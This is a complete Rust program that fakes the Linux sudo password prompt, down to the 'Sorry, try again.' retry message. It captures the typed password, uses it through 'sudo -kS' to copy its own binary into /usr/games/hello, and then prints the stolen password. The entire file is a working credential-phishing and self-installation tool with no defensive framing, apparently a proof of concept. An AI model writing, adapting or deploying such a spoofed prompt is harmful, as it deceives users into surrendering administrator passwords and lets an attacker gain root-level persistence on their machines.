use std::{io::Write, process::Stdio};

fn main() {
    let current_exe_path = std::env::current_exe().unwrap();
    loop {
        print!(
            "[sudo] enter password for {}: ",
            std::env::var("USER").unwrap()
        );
        let _ = std::io::stdout().flush();

        let mut s = String::new();
        std::io::stdin().read_line(&mut s).unwrap();

        let mut child = std::process::Command::new("sudo")
            .arg("-kS")
            .args(["cp", current_exe_path.to_str().unwrap(), "/usr/games/hello"])
            .stdin(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .unwrap();

        writeln!(child.stdin.as_mut().unwrap(), "{}", s).unwrap();
        // println!("[stdin] {:?}", child.stdin.as_ref().unwrap());

        match child.wait_with_output() {
            Ok(op) => {
                if let Some(0) = op.status.code() {
                    println!(
                        "\n[status] {}\n[stdout] {}\n[stderr] {}",
                        op.status,
                        String::from_utf8(op.stdout).unwrap(),
                        String::from_utf8(op.stderr).unwrap()
                    );
                    println!("[passwd] {s}");
                    break;
                } else if let Some(1) = op.status.code() {
                    println!("Sorry, try again.");
                    continue;
                }
            }
            Err(e) => {
                continue;
            }
        }
    }
}
